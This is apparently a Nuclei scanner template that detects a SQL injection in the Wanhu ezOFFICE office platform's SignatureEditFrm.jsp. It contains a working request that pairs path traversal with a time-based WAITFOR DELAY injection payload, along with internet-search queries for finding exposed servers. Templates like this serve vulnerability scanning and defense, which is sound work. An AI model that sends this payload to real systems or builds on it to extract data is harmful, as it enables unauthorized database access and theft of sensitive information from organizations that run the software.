id: wanhu-signatureeditfrm-sqli

info:
  name: Wanhu OA SignatureEditFrm - SQL Injection
  author: qwtd
  severity: high
  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台SignatureEditFrm.jsp存在SQL注入漏洞，攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息。
  metadata:
    max-request: 1
    Fofa-query: body="/defaultroot/images"
    Quake-query: body="/defaultroot/images"
    Hunter-query: body="/defaultroot/images"
  tags: 万户网络-ezOFFICE

http:
  - raw:
      - |
        GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"
          - 'contains(body,"印章管理")'
        condition: and
